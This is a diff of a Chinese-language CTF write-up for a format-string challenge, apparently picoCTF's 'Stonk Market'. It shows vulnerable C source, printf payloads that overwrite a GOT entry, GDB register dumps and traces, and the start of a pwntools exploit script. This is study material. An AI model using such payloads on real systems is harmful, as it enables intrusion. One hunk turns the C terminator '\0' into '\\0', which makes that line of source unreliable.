@@ -13,8 +13,7 @@ date: 2024-01-31
 FMT
 
 ## Source code
-:::spoiler
-```cpp=
+```cpp
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
@@ -67,7 +66,7 @@ Stonk *pick_symbol_with_AI(int shares) {
 		if (i < AI_symbol_len) {
 			stonk->symbol[i] = 'A' + (rand() % 26);
 		} else {
-			stonk->symbol[i] = '\0';
+			stonk->symbol[i] = '\\0';
 		}
 	}
 
@@ -164,7 +163,6 @@ int main(int argc, char *argv[])
 }
 
 ```
-:::
 
 ## Recon
 這一題是參考了[^pico_pwn_stonk_market_wp]，可以看到source code中的buy_stonks function出現format string bug，我一開始看了很久，以為這一題是和heap有關的問題
@@ -186,8 +184,7 @@ int main(int argc, char *argv[])
    0x7ffff7e40bd8 <printf_positional+7736> movsx  r10, r10b
 ```
 
-- ==Incorrect Payload:== `%6299672c%12$n%216c%20$hhn%10504067c%10$n`遇到的問題
-    :::spoiler Register
+- **Incorrect Payload:** `%6299672c%12$n%216c%20$hhn%10504067c%10$n`遇到的問題
     ```
     $rdi   : 0x0
     $rax   : 0x0
@@ -209,9 +206,7 @@ int main(int argc, char *argv[])
     $rsp   : 0x00007fffffffa060  →  0x0000000000000000
     $gs: 0x00 $fs: 0x00 $es: 0x00 $cs: 0x33 $ss: 0x2b $ds: 0x00
     ```
-    :::
-* ==Correct Payload:== `%c%c%c%c%c%c%c%c%c%c%6299662c%n%216c%20$hhn%10504067c%10$n`
-    :::spoiler Register
+* **Correct Payload:** `%c%c%c%c%c%c%c%c%c%c%6299662c%n%216c%20$hhn%10504067c%10$n`
     ```
     $rdi   : 0x0
     $rax   : 0x0000000000602018  →  0x00000000004006c6  →  0xffe0e90000000068 ("h"?)
@@ -233,8 +228,7 @@ int main(int argc, char *argv[])
     $rsp   : 0x00007fffffffa060  →  0x0000000000000000
     $gs: 0x00 $fs: 0x00 $es: 0x00 $cs: 0x33 $ss: 0x2b $ds: 0x00
     ```
-    :::
-可以看到`0x7ffff7e40bc4 mov BYTE PTR [rax], bl`準備把0xf0的值放到rax指向的位置，但是如果是第一種payload，rax的value是0，而第二種payload所存放的value才是0x602018，所以這應該就是@ccccctw所提到的問題，一開始把`0x602018`寫入`0x00007fffffffd7d0`之前都還是零，所以第二種payload因為某種關係，他可以先把`0x602018`寫入`0x00007fffffffd7d0`，==再==把`0x602018`指向的`0x4006c6`最後一個byte改掉，而不是像第一種payload一樣，是同時執行所有的動作，導致系統還沒有把`0x602018`寫入`0x00007fffffffd7d0`，想當然`0x00007fffffffd7d0`的value也是零
+可以看到`0x7ffff7e40bc4 mov BYTE PTR [rax], bl`準備把0xf0的值放到rax指向的位置，但是如果是第一種payload，rax的value是0，而第二種payload所存放的value才是0x602018，所以這應該就是@ccccctw所提到的問題，一開始把`0x602018`寫入`0x00007fffffffd7d0`之前都還是零，所以第二種payload因為某種關係，他可以先把`0x602018`寫入`0x00007fffffffd7d0`，**再**把`0x602018`指向的`0x4006c6`最後一個byte改掉，而不是像第一種payload一樣，是同時執行所有的動作，導致系統還沒有把`0x602018`寫入`0x00007fffffffd7d0`，想當然`0x00007fffffffd7d0`的value也是零
 ```
 ...
 0x00007fffffffd790│+0x0030: 0x00007fffffffd7d0  →  0x0000000000000000    ← $rbp
@@ -243,7 +237,7 @@ int main(int argc, char *argv[])
 ```
 
 ---
-:::spoiler 完整的trace stack
+
 ```
 gef➤  bt 10
 #0  0x00007ffff7e40bc4 in printf_positional (s=s@entry=0x7fffffffafc0, format=format@entry=0x603730 "%6299672c%12$n%216c%20$hhn%10504067c%10$n", readonly_format=readonly_format@entry=0x0, ap=ap@entry=0x7fffffffd680, ap_savep=ap_savep@entry=0x7fffffffab48, done=<optimized out>, nspecs_done=<optimized out>, lead_str_end=<optimized out>, work_buffer=<optimized out>, save_errno=<optimized out>, grouping=<optimized out>, thousands_sep=<optimized out>, mode_flags=<optimized out>) at vfprintf-internal.c:2072
@@ -254,10 +248,9 @@ gef➤  bt 10
 #5  0x0000000000400ace in buy_stonks ()
 #6  0x0000000000400c66 in main ()
 ```
-:::
 
 ## Exploit - FMT
-```python=
+```python
 from pwn import *
 
 if args.LOCAL:
